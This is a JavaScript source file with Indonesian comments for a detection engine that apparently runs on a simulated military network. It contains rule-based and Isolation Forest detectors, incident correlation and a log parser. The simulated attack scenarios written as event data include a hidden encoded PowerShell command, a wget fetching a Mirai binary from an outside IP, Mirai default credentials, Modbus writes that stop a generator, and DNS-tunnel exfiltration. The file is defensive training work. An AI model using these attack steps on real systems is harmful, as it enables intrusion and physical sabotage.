/* KARTIKA-SENTINEL — Mesin Deteksi
 * 1) Rule engine (gaya Sigma) untuk protokol IT & OT (Modbus/TCP, Telnet, SMB, DNS, HTTP, ARP)
 * 2) AI deteksi anomali: Isolation Forest (unsupervised) atas fitur perilaku per-aset per-jendela waktu
 * 3) Mesin korelasi: alert -> insiden berbasis rantai serangan (kill chain) + skor risiko
 * Semua berjalan lokal di perangkat; tidak ada data yang dikirim keluar. */
'use strict';

/* ---------------- util ---------------- */
let _seed = 1337;
function rnd() { _seed = (_seed * 1664525 + 1013904223) % 4294967296; return _seed / 4294967296; }
function pick(a) { return a[Math.floor(rnd() * a.length)]; }
function entropy(s) {
  const f = {}; for (const c of s) f[c] = (f[c] || 0) + 1;
  let e = 0; for (const k in f) { const p = f[k] / s.length; e -= p * Math.log2(p); } return e;
}
function randLabel(n) { const cs = 'abcdefghijklmnopqrstuvwxyz0123456789'; let s = ''; for (let i = 0; i < n; i++) s += cs[Math.floor(rnd() * cs.length)]; return s; }

/* ---------------- Isolation Forest ---------------- */
class IsolationForest {
  constructor(nTrees = 100, sampleSize = 128) { this.nTrees = nTrees; this.psi = sampleSize; this.trees = []; }
  static c(n) { return n > 2 ? 2 * (Math.log(n - 1) + 0.5772156649) - 2 * (n - 1) / n : (n === 2 ? 1 : 0); }
  fit(X) {
    this.dim = X[0].length; const maxH = Math.ceil(Math.log2(this.psi));
    this.mean = Array(this.dim).fill(0); this.std = Array(this.dim).fill(0);
    X.forEach(x => x.forEach((v, j) => this.mean[j] += v / X.length));
    X.forEach(x => x.forEach((v, j) => this.std[j] += (v - this.mean[j]) ** 2 / X.length));
    this.std = this.std.map(s => Math.sqrt(s) || 1);
    for (let t = 0; t < this.nTrees; t++) {
      const sample = []; for (let i = 0; i < Math.min(this.psi, X.length); i++) sample.push(X[Math.floor(rnd() * X.length)]);
      this.trees.push(this._build(sample, 0, maxH));
    }
    return this;
  }
  _build(X, h, maxH) {
    if (h >= maxH || X.length <= 1) return { size: X.length };
    const cand = [];
    for (let j = 0; j < this.dim; j++) { let a = Infinity, b = -Infinity; for (const x of X) { if (x[j] < a) a = x[j]; if (x[j] > b) b = x[j]; } if (b > a) cand.push([j, a, b]); }
    if (!cand.length) return { size: X.length };
    const [q, mn, mx] = cand[Math.floor(rnd() * cand.length)];
    const p = mn + rnd() * (mx - mn);
    return { q, p, l: this._build(X.filter(x => x[q] < p), h + 1, maxH), r: this._build(X.filter(x => x[q] >= p), h + 1, maxH) };
  }
  _path(x, n, h) { return n.size !== undefined ? h + IsolationForest.c(n.size) : this._path(x, x[n.q] < n.p ? n.l : n.r, h + 1); }
  score(x) {
    const avg = this.trees.reduce((s, t) => s + this._path(x, t, 0), 0) / this.trees.length;
    return Math.pow(2, -avg / IsolationForest.c(this.psi));
  }
  explain(x) { // fitur yang paling menyimpang dari baseline (z-score)
    return x.map((v, j) => ({ j, z: (v - this.mean[j]) / this.std[j] })).sort((a, b) => b.z - a.z);
  }
}
const FEATURES = ['Koneksi keluar', 'Tujuan unik', 'Port unik', 'Volume data (KB)', 'Gagal autentikasi', 'Panjang query DNS', 'Perintah tulis OT'];

/* ---------------- Generator lalu lintas normal ---------------- */
const WS = ['WS-STAF-01', 'WS-STAF-02', 'WS-STAF-03', 'WS-STAF-04'];
const NORMAL_DOMAINS = ['tniad.mil.id', 'kemhan.go.id', 'update.microsoft.com', 'google.com', 'bmkg.go.id', 'antaranews.com'];
function ev(t, src, dst, proto, port, extra = {}) {
  return Object.assign({ ts: t, src, dst, proto, port, bytes: 0, type: 'conn' }, extra);
}
function normalTraffic(t, dt) {
  const out = []; const n = Math.max(1, Math.round(dt * 1.6 * (0.7 + rnd() * 0.6)));
  for (let i = 0; i < n; i++) {
    const r = rnd(); const ws = pick(WS); const ts = t + rnd() * dt;
    if (r < 0.22) out.push(ev(ts, ws, 'INET', 'https', 443, { bytes: 20 + rnd() * 180, dstIp: '103.' + Math.floor(rnd() * 255) + '.12.' + Math.floor(rnd() * 255) }));
    else if (r < 0.38) { const d = pick(NORMAL_DOMAINS); out.push(ev(ts, ws, 'SRV-AD', 'dns', 53, { type: 'dns', query: pick(['www.', 'mail.', 'portal.', '']) + d, bytes: 0.2 })); }
    else if (r < 0.50) out.push(ev(ts, ws, 'SRV-AD', 'kerberos', 88, { type: 'auth_ok', user: 'staf' + ws.slice(-2), bytes: 1 }));
    else if (r < 0.64) out.push(ev(ts, ws, 'SRV-FILE', 'smb', 445, { share: 'DATA_STAF', bytes: 10 + rnd() * 90 }));
    else if (r < 0.74) out.push(ev(ts, 'WS-ENG', 'PLC-GENSET', 'modbus', 502, { type: 'modbus', fc: 3, reg: 40001 + Math.floor(rnd() * 8), bytes: 0.1 }));
    else if (r < 0.80) out.push(ev(ts, 'SRV-MON', 'UPS-01', 'snmp', 161, { bytes: 0.3 }));
    else if (r < 0.90) out.push(ev(ts, pick(['CCTV-01', 'CCTV-02']), 'NVR-01', 'rtsp', 554, { bytes: 150 + rnd() * 60 }));
    else if (r < 0.95) out.push(ev(ts, 'AKSES-01', 'SRV-AD', 'https', 443, { bytes: 0.5, detail: 'sinkron kartu akses' }));
    else out.push(ev(ts, 'RADIO-GW', 'SRV-MON', 'syslog', 514, { bytes: 0.2 }));
  }
  return out;
}

/* ---------------- Skenario serangan (latihan / cyber range) ---------------- */
const SCENARIOS = [
  {
    id: 'ransom', name: 'Spear-phishing → Ransomware', dom: 'IT', icon: '🎣',
    desc: 'Dokumen phishing dibuka di PC Staf Pers, beacon C2, brute force ke Domain Controller, pergerakan lateral SMB, enkripsi server berkas.',
    build(t0) {
      const e = []; const C2 = '185.220.101.47';
      e.push(ev(t0 + 1, 'INET', 'SRV-MAIL', 'smtp', 25, { type: 'mail', detail: 'Lampiran "Surat_Perintah_Latihan.docm" dari office-dokumen.id-update.com', bytes: 2 }));
      e.push(ev(t0 + 4, 'WS-STAF-02', 'WS-STAF-02', 'proc', 0, { type: 'proc', parent: 'WINWORD.EXE', child: 'powershell.exe', cmd: 'powershell -nop -w hidden -enc SQBFAFgA...', bytes: 0 }));
      for (let i = 0; i < 7; i++) e.push(ev(t0 + 6 + i * 3, 'WS-STAF-02', 'INET', 'https', 443, { dstIp: C2, bytes: 1.2, detail: 'GET /api/v2/sync' }));
      for (let i = 0; i < 14; i++) e.push(ev(t0 + 26 + i * 0.6, 'WS-STAF-02', 'SRV-AD', 'kerberos', 88, { type: 'auth_fail', user: pick(['administrator', 'admin.ops', 'dansat', 'pasi.intel']), bytes: 0.5 }));
      e.push(ev(t0 + 35, 'WS-STAF-02', 'SRV-AD', 'kerberos', 88, { type: 'auth_ok', user: 'admin.ops', bytes: 0.5 }));
      ['SRV-FILE', 'WS-STAF-01', 'SRV-AD'].forEach((d, i) => e.push(ev(t0 + 40 + i * 2, 'WS-STAF-02', d, 'smb', 445, { share: 'ADMIN$', bytes: 300, detail: 'PSEXESVC.exe ditulis' })));
      for (let i = 0; i < 40; i++) e.push(ev(t0 + 50 + i * 0.4, 'SRV-FILE', 'SRV-FILE', 'file', 0, { type: 'file_rename', detail: `\\\\DATA_STAF\\Renops\\dok_${i}.docx → .kartlock`, bytes: 0 }));
      return e;
    },
  },
  {
    id: 'genset', name: 'Sabotase Genset via Modbus', dom: 'OT', icon: '⚡',
    desc: 'PC Staf Log yang telah disusupi memindai zona OT, membaca status PLC, lalu mengirim perintah tulis Modbus tak sah untuk mematikan genset.',
    build(t0) {
      const e = []; const ports = [21, 22, 23, 80, 102, 161, 443, 502, 554, 1911, 2404, 4840, 8080, 20000, 44818];
      ['PLC-GENSET', 'UPS-01', 'NVR-01', 'CCTV-01', 'CCTV-02', 'AKSES-01', 'RADIO-GW'].forEach((d, i) =>
        ports.forEach((p, k) => e.push(ev(t0 + 1 + i * 1.2 + k * 0.05, 'WS-STAF-03', d, 'tcp', p, { type: 'conn', flags: 'S', bytes: 0.05 }))));
      e.push(ev(t0 + 14, 'WS-STAF-03', 'PLC-GENSET', 'modbus', 502, { type: 'modbus', fc: 43, detail: 'Read Device Identification', bytes: 0.2 }));
      for (let i = 0; i < 6; i++) e.push(ev(t0 + 16 + i, 'WS-STAF-03', 'PLC-GENSET', 'modbus', 502, { type: 'modbus', fc: 3, reg: 40001 + i, bytes: 0.1 }));
      e.push(ev(t0 + 25, 'WS-STAF-03', 'PLC-GENSET', 'modbus', 502, { type: 'modbus', fc: 6, reg: 40010, value: 0, detail: 'Write Single Register: SETPOINT_BEBAN = 0', bytes: 0.1 }));
      e.push(ev(t0 + 27, 'WS-STAF-03', 'PLC-GENSET', 'modbus', 502, { type: 'modbus', fc: 5, reg: 1, value: 0, detail: 'Write Single Coil: GENSET_RUN = OFF', bytes: 0.1 }));
      e.push(ev(t0 + 29, 'WS-STAF-03', 'PLC-GENSET', 'modbus', 502, { type: 'modbus', fc: 16, reg: 40020, value: 9999, detail: 'Write Multiple Registers: AMBANG_ALARM dinonaktifkan', bytes: 0.2 }));
      e.push(ev(t0 + 31, 'PLC-GENSET', 'SRV-MON', 'syslog', 514, { type: 'ot_state', detail: 'STATUS: GENSET STOP — beban 0 kW', bytes: 0.1 }));
      return e;
    },
  },
  {
    id: 'mirai', name: 'Pembajakan CCTV (Botnet ala Mirai)', dom: 'OT', icon: '📹',
    desc: 'Pemindai dari internet menemukan Telnet terbuka di CCTV Gudang Senjata, login dengan kredensial bawaan, lalu kamera dipakai untuk serangan DDoS.',
    build(t0) {
      const e = []; const A = '45.95.147.12';
      for (let i = 0; i < 6; i++) e.push(ev(t0 + 1 + i * 0.5, 'INET', pick(['CCTV-01', 'CCTV-02', 'NVR-01']), 'telnet', 23, { srcIp: A, type: 'conn', flags: 'S', bytes: 0.05 }));
      ['root:xc3511', 'root:vizxv', 'admin:admin', 'root:888888', 'support:support', 'root:12345', 'admin:1234', 'root:default', 'guest:12345'].forEach((c, i) =>
        e.push(ev(t0 + 5 + i * 0.7, 'INET', 'CCTV-02', 'telnet', 23, { srcIp: A, type: 'auth_fail', user: c.split(':')[0], bytes: 0.1 })));
      e.push(ev(t0 + 12, 'INET', 'CCTV-02', 'telnet', 23, { srcIp: A, type: 'auth_ok', user: 'admin', detail: 'Login berhasil — kredensial bawaan admin:admin', bytes: 0.1 }));
      e.push(ev(t0 + 14, 'CCTV-02', 'INET', 'http', 80, { dstIp: '194.26.29.113', detail: 'wget http://194.26.29.113/bins/arm7', bytes: 80 }));
      for (let i = 0; i < 30; i++) e.push(ev(t0 + 20 + i * 0.3, 'CCTV-02', 'INET', 'udp', 53, { dstIp: '203.0.113.' + (i % 5 + 10), type: 'flood', bytes: 900 }));
      return e;
    },
  },
  {
    id: 'dnsexfil', name: 'Eksfiltrasi Dokumen via DNS Tunneling', dom: 'IT', icon: '🕳️',
    desc: 'Malware senyap di PC Staf Intel mencuri dokumen dengan menyelipkan data ke dalam query DNS menuju domain penyerang.',
    build(t0) {
      const e = [];
      for (let i = 0; i < 24; i++) e.push(ev(t0 + 2 + i * 1.1, 'WS-STAF-04', 'SRV-AD', 'dns', 53, { type: 'dns', query: randLabel(52) + '.' + randLabel(20) + '.upd-cdn-sync.net', bytes: 0.3 }));
      return e;
    },
  },
  {
    id: 'rogue', name: 'Perangkat Liar & ARP Spoofing', dom: 'IT', icon: '📡',
    desc: 'Perangkat tak dikenal tersambung ke Access Point markas lalu meracuni tabel ARP untuk menyadap lalu lintas staf (man-in-the-middle).',
    build(t0) {
      const e = [];
      e.push(ev(t0 + 1, 'WIFI-AP', 'SRV-MON', 'dhcp', 67, { type: 'dhcp', mac: 'de:ad:be:ef:13:37', hostname: 'android-7f3a', ip: '10.10.1.99', bytes: 0.1 }));
      for (let i = 0; i < 8; i++) e.push(ev(t0 + 5 + i * 1.5, 'WIFI-AP', 'WS-STAF-01', 'arp', 0, { type: 'arp', claimIp: '10.10.0.1', mac: 'de:ad:be:ef:13:37', detail: 'Gratuitous ARP: 10.10.0.1 is-at de:ad:be:ef:13:37', bytes: 0 }));
      return e;
    },
  },
];

/* ---------------- Mesin deteksi ---------------- */
class DetectionEngine {
  constructor(opts = {}) {
    this.alerts = []; this.incidents = []; this.events = [];
    this.win = []; this.state = {}; this.fired = new Set(); this.alertSeq = 0; this.incSeq = 0;
    this.blockedIps = new Set(); this.isolated = new Set();
    this.onAlert = opts.onAlert || (() => {});
    this.windowSec = 10; this.lastWindow = null;
    this.model = opts.model || null; this.threshold = 0.65;
  }
  _cnt(key, t, span) { // sliding counter
    const a = (this.state[key] = this.state[key] || []); a.push(t);
    while (a.length && a[0] < t - span) a.shift(); return a.length;
  }
  _set(key, val, t, span) {
    const a = (this.state[key] = this.state[key] || []); a.push([t, val]);
    while (a.length && a[0][0] < t - span) a.shift(); return new Set(a.map(x => x[1])).size;
  }
  isBlocked(e) {
    if (this.isolated.has(e.src) || this.isolated.has(e.dst)) return 'Host diisolasi';
    if (this.plcLocked && e.type === 'modbus' && e.src !== 'WS-ENG') return 'Firewall Modbus/RUN-LOCK';
    if ((e.dstIp && this.blockedIps.has(e.dstIp)) || (e.srcIp && this.blockedIps.has(e.srcIp))) return 'IP diblokir firewall';
    return null;
  }
  ingest(e) {
    const b = this.isBlocked(e);
    if (b) { e.blocked = b; this.events.push(e); return; }
    this.events.push(e); this.win.push(e);
    if (this.events.length > 4000) this.events.splice(0, 1000);
    this._rules(e);
  }
  alert(e, rule, sev, techs, title, detail, assets, once = true) {
    const key = rule + '|' + assets.join(',');
    if (once && this.fired.has(key)) return null;
    this.fired.add(key);
    const a = { id: 'AL-' + String(++this.alertSeq).padStart(4, '0'), ts: e.ts, rule, sev, techs, title, detail, assets, ev: e,
      src: e.srcIp || ASSET_BY_ID[e.src]?.ip, dst: e.dstIp || ASSET_BY_ID[e.dst]?.ip };
    this.alerts.push(a); this._correlate(a); this.onAlert(a); return a;
  }
  _rules(e) {
    const t = e.ts; const srcA = ASSET_BY_ID[e.src]; const dstA = ASSET_BY_ID[e.dst];
    // R1 Brute force & keberhasilan setelah brute force
    if (e.type === 'auth_fail') {
      const n = this._cnt('af|' + e.src + '|' + e.dst, t, 60);
      (this.state['afu|' + e.src + '|' + e.dst] = this.state['afu|' + e.src + '|' + e.dst] || new Set()).add(e.user);
      if (n >= 8) this.alert(e, 'BRUTE_FORCE', e.proto === 'telnet' ? 'high' : 'high', e.proto === 'telnet' ? ['T0812', 'T1110'] : ['T1110'],
        `Brute force ${e.proto.toUpperCase()} terhadap ${e.dst}`, `${n} kegagalan autentikasi dalam 60 detik dari ${e.srcIp || e.src} (akun dicoba: ${e.user}, dll).`, [e.src, e.dst]);
    }
    if (e.type === 'auth_ok') {
      const fails = (this.state['af|' + e.src + '|' + e.dst] || []).filter(x => x > t - 120).length;
      const tried = this.state['afu|' + e.src + '|' + e.dst];
      if (fails >= 5 && tried && tried.has(e.user)) {
        const iot = dstA && ['camera', 'nvr', 'plc', 'ups', 'access', 'radio'].includes(dstA.type);
        this.alert(e, 'BF_SUCCESS', 'critical', iot ? ['T0812', 'T1078.001', 'T0883'] : ['T1078'],
          `Akun berhasil dibobol: ${e.user}@${e.dst}`, `Login sukses setelah ${fails} kegagalan beruntun. ${e.detail || ''}`, [e.src, e.dst]);
      }
    }
    // R2 Pemindaian jaringan / ICS discovery
    if (e.type === 'conn' && e.flags === 'S') {
      const np = this._set('ps|' + e.src, e.port, t, 30); const nh = this._set('ph|' + e.src, e.dst, t, 30);
      if (np >= 12 || nh >= 3) {
        const ot = dstA && dstA.zone === 'ot';
        this.alert(e, 'PORT_SCAN', ot ? 'high' : 'medium', ot ? ['T0846', 'T1046'] : ['T1595', 'T1046'],
          `Pemindaian ${ot ? 'zona OT' : 'jaringan'} dari ${e.srcIp || e.src}`, `${np} port & ${nh} host berbeda disentuh dalam 30 detik${np >= 12 ? ' (termasuk port industri 502/102/44818/20000)' : ''}.`, e.src === 'INET' ? [e.dst] : [e.src]);
      }
    }
    // R3/R4 Modbus
    if (e.type === 'modbus') {
      const authorized = e.src === 'WS-ENG';
      if ([5, 6, 15, 16].includes(e.fc) && !authorized)
        this.alert(e, 'MODBUS_WRITE', 'critical', ['T0855', 'T0836', 'T0831'], `Perintah tulis Modbus TAK SAH ke ${e.dst}`,
          `FC${e.fc} dari ${e.src} (bukan workstation teknisi resmi). ${e.detail || ''}`, [e.src, e.dst], false);
      else if (!authorized && (e.fc === 43 || e.fc === 3))
        this.alert(e, 'MODBUS_RECON', 'high', e.fc === 43 ? ['T0888'] : ['T0801'], `Pembacaan PLC dari host tak berwenang`,
          `${e.src} melakukan ${e.fc === 43 ? 'identifikasi perangkat (FC43)' : 'pembacaan register proses (FC3)'} pada ${e.dst}.`, [e.src, e.dst]);
    }
    if (e.type === 'ot_state' && /STOP/.test(e.detail))
      this.alert(e, 'OT_IMPACT', 'critical', ['T0826', 'T0831'], `Gangguan proses fisik: ${e.src}`, e.detail, [e.src]);
    // R5 Eksekusi makro berbahaya
    if (e.type === 'proc' && /WINWORD|EXCEL|OUTLOOK/i.test(e.parent) && /powershell|cmd|wscript|mshta/i.test(e.child))
      this.alert(e, 'MAL_DOC', 'high', ['T1566.001', 'T1204.002', 'T1059.001'], `Dokumen Office menjalankan ${e.child} di ${e.src}`, e.cmd, [e.src]);
    // R6 DNS tunneling (entropi Shannon + panjang label)
    if (e.type === 'dns') {
      const lab = e.query.split('.')[0]; const ent = entropy(lab);
      if (lab.length > 35 && ent > 3.6) {
        const n = this._cnt('dns|' + e.src, t, 60);
        const dom = e.query.split('.').slice(-2).join('.');
        if (n >= 5) this.alert(e, 'DNS_TUNNEL', 'high', ['T1071.004', 'T1048'], `Indikasi DNS tunneling dari ${e.src}`,
          `${n} query ber-entropi tinggi (H=${ent.toFixed(2)} bit/karakter, panjang ${lab.length}) ke *.${dom}${LOCAL_IOC.domains[dom] ? ' — cocok IoC: ' + LOCAL_IOC.domains[dom] : ''}.`, [e.src]);
      }
    }
    // R7 Beacon C2 (interval periodik, jitter rendah) + IoC
    if ((e.proto === 'https' || e.proto === 'http') && e.dst === 'INET' && e.dstIp) {
      const key = 'bc|' + e.src + '|' + e.dstIp; const a = (this.state[key] = this.state[key] || []); a.push(t);
      if (a.length >= 5) {
        const iv = a.slice(-5).map((x, i, arr) => i ? x - arr[i - 1] : null).slice(1);
        const m = iv.reduce((s, x) => s + x, 0) / iv.length; const sd = Math.sqrt(iv.reduce((s, x) => s + (x - m) ** 2, 0) / iv.length);
        if (m > 0 && sd / m < 0.15) this.alert(e, 'C2_BEACON', 'high', ['T1071.001'], `Beacon C2 terdeteksi dari ${e.src}`,
          `Koneksi periodik ke ${e.dstIp} setiap ±${m.toFixed(1)} detik (koefisien variasi ${(sd / m).toFixed(2)}).${LOCAL_IOC.ips[e.dstIp] ? ' Cocok IoC: ' + LOCAL_IOC.ips[e.dstIp] + '.' : ''}`, [e.src]);
      }
      if (LOCAL_IOC.ips[e.dstIp]) this.alert(e, 'IOC_MATCH', 'high', ['T1071.001'], `Koneksi ke IP berbahaya (${e.dstIp})`, `${e.src} → ${e.dstIp}: ${LOCAL_IOC.ips[e.dstIp]}. ${e.detail || ''}`, [e.src]);
    }
    // R8 Pergerakan lateral SMB admin share
    if (e.proto === 'smb' && /ADMIN\$|C\$|IPC\$/.test(e.share || '') && srcA && srcA.type === 'workstation') {
      const n = this._set('lat|' + e.src, e.dst, t, 120);
      this.alert(e, 'LATERAL_SMB', n >= 2 ? 'critical' : 'high', ['T1021.002'], `Pergerakan lateral via ${e.share} dari ${e.src}`,
        `${e.src} menulis ke share administratif di ${n} host (terakhir ${e.dst}). ${e.detail || ''}`, [e.src, e.dst], false);
    }
    // R9 Ransomware (rename massal)
    if (e.type === 'file_rename') {
      const n = this._cnt('fr|' + e.src, t, 30);
      if (n >= 20) this.alert(e, 'RANSOMWARE', 'critical', ['T1486'], `Enkripsi massal berkas di ${e.src} (ransomware)`, `${n} berkas diganti ekstensi menjadi .kartlock dalam 30 detik.`, [e.src]);
    }
    // R10 DDoS keluar dari perangkat IoT
    if (e.type === 'flood') {
      const n = this._cnt('fl|' + e.src, t, 10);
      if (n >= 10) this.alert(e, 'DDOS_OUT', 'high', ['T1498'], `${e.src} membanjiri target eksternal (DDoS)`, `${n} burst UDP/53 bervolume tinggi dalam 10 detik — perangkat kemungkinan menjadi bagian botnet.`, [e.src]);
    }
    if (e.srcIp && LOCAL_IOC.ips[e.srcIp] && e.type === 'conn') this.alert(e, 'IOC_SCAN', 'medium', ['T1595', 'T0883'], `Pemindaian dari IP berbahaya ${e.srcIp}`, LOCAL_IOC.ips[e.srcIp], [e.dst]);
    // R11 Perangkat liar & ARP spoofing
    if (e.type === 'dhcp' && !KNOWN_MACS.has(e.mac))
      this.alert(e, 'ROGUE_DEVICE', 'medium', ['T1200'], `Perangkat tak terdaftar tersambung (${e.mac})`, `Hostname "${e.hostname}" memperoleh IP ${e.ip} melalui ${e.src}. MAC tidak ada di inventaris aset.`, [e.src]);
    if (e.type === 'arp' && e.claimIp === '10.10.0.1' && !KNOWN_MACS.has(e.mac)) {
      const n = this._cnt('arp|' + e.mac, t, 30);
      if (n >= 3) this.alert(e, 'ARP_SPOOF', 'high', ['T1557.002'], `ARP spoofing: gateway dipalsukan`, `${n} gratuitous ARP mengklaim ${e.claimIp} (gateway) dari MAC liar ${e.mac}.`, [e.src, 'FW-01']);
    }
  }
  /* --- AI: jendela fitur perilaku per aset --- */
  static features(events, asset) {
    const out = events.filter(e => e.src === asset);
    const dst = new Set(out.map(e => e.dst + (e.dstIp || ''))); const ports = new Set(out.map(e => e.port));
    const kb = out.reduce((s, e) => s + (e.bytes || 0), 0);
    const af = out.filter(e => e.type === 'auth_fail').length;
    const dns = out.filter(e => e.type === 'dns'); const dl = dns.length ? dns.reduce((s, e) => s + e.query.length, 0) / dns.length : 0;
    const w = out.filter(e => e.type === 'modbus' && [5, 6, 15, 16].includes(e.fc)).length;
    return [out.length, dst.size, ports.size, kb, af, dl, w];
  }
  windowTick(now) {
    if (!this.model) return;
    if (this.lastWindow === null) this.lastWindow = now;
    if (now - this.lastWindow < this.windowSec) return;
    const evs = this.win.filter(e => e.ts >= this.lastWindow); this.win = []; this.lastWindow = now;
    for (const a of ASSETS) {
      if (a.id === 'INET' || this.isolated.has(a.id)) continue;
      const x = DetectionEngine.features(evs, a.id); const s = this.model.score(a.id, x);
      if (s > this.threshold) {
        const ex = this.model.explain(a.id, x).slice(0, 2).map(f => `${FEATURES[f.j]} (z=+${f.z.toFixed(1)})`).join(', ');
        const bucket = Math.floor(now / 120);
        this.alert({ ts: now, src: a.id }, 'AI_ANOMALY#' + bucket, s > 0.75 ? 'high' : 'medium', [], `AI: perilaku anomali pada ${a.id}`,
          `Skor Isolation Forest ${s.toFixed(2)} (ambang ${this.threshold}) terhadap baseline normal aset ini. Penyimpangan utama: ${ex}.`, [a.id]);
      }
    }
  }
  /* --- Korelasi insiden --- */
  _correlate(a) {
    const real = a.assets.filter(x => x !== 'INET');
    const ext = [a.ev.srcIp, a.ev.dstIp].filter(Boolean);
    let inc = this.incidents.find(i => i.status === 'Aktif' && a.ts - i.last < 600 && (real.some(x => i.assets.has(x)) || ext.some(x => i.ext.has(x))));
    if (!inc) {
      inc = { id: 'INS-' + String(++this.incSeq).padStart(3, '0'), first: a.ts, last: a.ts, alerts: [], assets: new Set(), techs: new Set(), ext: new Set(), status: 'Aktif', actions: [], sev: 0 };
      this.incidents.push(inc);
    }
    inc.alerts.push(a); inc.last = a.ts; real.forEach(x => inc.assets.add(x)); a.techs.forEach(x => inc.techs.add(x)); ext.forEach(x => inc.ext.add(x));
    a.incident = inc.id; this._score(inc);
  }
  _score(inc) {
    const maxSev = Math.max(...inc.alerts.map(a => SEV[a.sev]));
    const tactics = new Set([...inc.techs].map(t => MITRE[t]?.tactic).filter(Boolean));
    const crit = Math.max(...[...inc.assets].map(x => ASSET_BY_ID[x]?.crit || 1));
    inc.score = Math.min(100, Math.round(maxSev * 15 + tactics.size * 6 + crit * 5));
    inc.sev = inc.score >= 80 ? 4 : inc.score >= 60 ? 3 : inc.score >= 40 ? 2 : 1;
    inc.tactics = TACTIC_ORDER.filter(t => tactics.has(t));
    const top = inc.alerts.slice().sort((x, y) => SEV[y.sev] - SEV[x.sev] || y.ts - x.ts)[0];
    inc.title = top.title;
    inc.ot = [...inc.assets].some(x => ASSET_BY_ID[x]?.zone === 'ot');
  }
  assetRisk(id) {
    const a = ASSET_BY_ID[id]; if (!a || id === 'INET') return 0;
    const al = this.alerts.filter(x => x.assets.includes(id) && !this.incidents.find(i => i.id === x.incident && i.status === 'Terkendali'));
    const sevSum = al.reduce((s, x) => s + SEV[x.sev] * 6, 0);
    return Math.min(100, Math.round(a.crit * 6 + a.vulns.length * 10 + sevSum));
  }
  posture() {
    const active = this.incidents.filter(i => i.status === 'Aktif');
    const pen = active.reduce((s, i) => s + i.score * 0.35, 0);
    const vuln = ASSETS.reduce((s, a) => s + a.vulns.length, 0) * 1.5;
    return Math.max(5, Math.round(100 - vuln - pen));
  }
}

/* ---------------- Pelatihan model baseline ---------------- */
// Baseline per-aset: setiap aset punya profil normalnya sendiri (rerata & simpangan baku per fitur).
// Vektor fitur dinormalisasi (z-score) terhadap profil aset tsb, lalu satu Isolation Forest dilatih atas z-vektor.
// Skor ensemble = 0.5·IsolationForest(z-log) + 0.5·(1 − e^(−zmax/6)) agar deviasi ekstrem di luar rentang latih tetap tertangkap.
class AssetBaselineModel {
  constructor(forest, prof) { this.forest = forest; this.prof = prof; }
  zl(asset, x) { const p = this.prof[asset]; return x.map((v, j) => (Math.log1p(v) - p.m[j]) / p.s[j]); }
  zr(asset, x) { const p = this.prof[asset]; return x.map((v, j) => (v - p.rm[j]) / p.rs[j]); }
  parts(asset, x) {
    const sIF = this.forest.score(this.zl(asset, x)); const zmax = Math.max(0, ...this.zr(asset, x));
    return { sIF, zmax, score: 0.5 * sIF + 0.5 * (1 - Math.exp(-zmax / 6)) };
  }
  score(asset, x) { return this.parts(asset, x).score; }
  explain(asset, x) { return this.zr(asset, x).map((z, j) => ({ j, z })).sort((a, b) => b.z - a.z); }
}
function trainBaseline() {
  const raw = {}; let t = 0; const dt = 1; let buf = [];
  ASSETS.forEach(a => { if (a.id !== 'INET') raw[a.id] = []; });
  for (let s = 0; s < 3600; s += dt) {
    buf.push(...normalTraffic(t, dt)); t += dt;
    if (s % 10 === 9) { for (const id in raw) raw[id].push(DetectionEngine.features(buf, id)); buf = []; }
  }
  const prof = {}; const Z = [];
  for (const id in raw) {
    const R = raw[id], X = R.map(x => x.map(Math.log1p)), d = X[0].length;
    const stat = (A, floor) => { const m = Array(d).fill(0), s = Array(d).fill(0);
      A.forEach(x => x.forEach((v, j) => m[j] += v / A.length)); A.forEach(x => x.forEach((v, j) => s[j] += (v - m[j]) ** 2 / A.length));
      return [m, s.map(v => Math.max(Math.sqrt(v), floor))]; };
    const [m, s] = stat(X, 0.35), [rm, rs] = stat(R, 1.5);
    prof[id] = { m, s, rm, rs };
    X.forEach(x => Z.push(x.map((v, j) => (v - m[j]) / s[j])));
  }
  return { model: new AssetBaselineModel(new IsolationForest(100, 256).fit(Z), prof), n: Z.length };
}

/* ---------------- Parser log eksternal (analisis forensik) ---------------- */
function parseLogs(text) {
  const out = []; const lines = text.split(/\r?\n/).filter(l => l.trim());
  let base = 0;
  for (const [i, l] of lines.entries()) {
    let m;
    if ((m = l.match(/(\w{3}\s+\d+\s[\d:]+).*sshd.*(Failed|Accepted) password for (?:invalid user )?(\S+) from ([\d.]+)/))) {
      const ts = Date.parse('2026 ' + m[1]) / 1000 || base + i;
      const src = ASSET_BY_IP[m[4]]?.id || 'INET';
      out.push(ev(ts, src, 'SRV-MAIL', 'ssh', 22, { type: m[2] === 'Failed' ? 'auth_fail' : 'auth_ok', user: m[3], srcIp: src === 'INET' ? m[4] : undefined, raw: l }));
    } else if ((m = l.match(/^([\d\-T:\.Z ]+),([\d.]+),([\d.]+),(\w+),(\d+),(\w+),?(.*)$/))) {
      const ts = Date.parse(m[1]) / 1000; const s = ASSET_BY_IP[m[2]]?.id || 'INET'; const d = ASSET_BY_IP[m[3]]?.id || 'INET';
      const extra = { type: m[6], raw: l, srcIp: s === 'INET' ? m[2] : undefined, dstIp: d === 'INET' ? m[3] : undefined };
      const kv = Object.fromEntries((m[7] || '').split(';').filter(Boolean).map(p => p.split('=')));
      if (kv.fc) extra.fc = +kv.fc; if (kv.query) extra.query = kv.query; if (kv.user) extra.user = kv.user; if (kv.share) extra.share = kv.share;
      if (kv.flags) extra.flags = kv.flags; if (kv.detail) extra.detail = kv.detail; extra.bytes = +(kv.kb || 0.1);
      out.push(ev(ts, s, d, m[4], +m[5], extra));
    }
  }
  return out.sort((a, b) => a.ts - b.ts);
}
const SAMPLE_LOG = `# Format 1: Linux auth.log (sshd)
Nov 14 02:11:01 srv-mail sshd[2211]: Failed password for root from 91.240.118.172 port 50122 ssh2
Nov 14 02:11:03 srv-mail sshd[2213]: Failed password for root from 91.240.118.172 port 50140 ssh2
Nov 14 02:11:05 srv-mail sshd[2215]: Failed password for invalid user admin from 91.240.118.172 port 50162 ssh2
Nov 14 02:11:07 srv-mail sshd[2217]: Failed password for invalid user oracle from 91.240.118.172 port 50181 ssh2
Nov 14 02:11:09 srv-mail sshd[2219]: Failed password for root from 91.240.118.172 port 50199 ssh2
Nov 14 02:11:11 srv-mail sshd[2221]: Failed password for invalid user test from 91.240.118.172 port 50213 ssh2
Nov 14 02:11:13 srv-mail sshd[2223]: Failed password for root from 91.240.118.172 port 50230 ssh2
Nov 14 02:11:15 srv-mail sshd[2225]: Failed password for invalid user ubuntu from 91.240.118.172 port 50251 ssh2
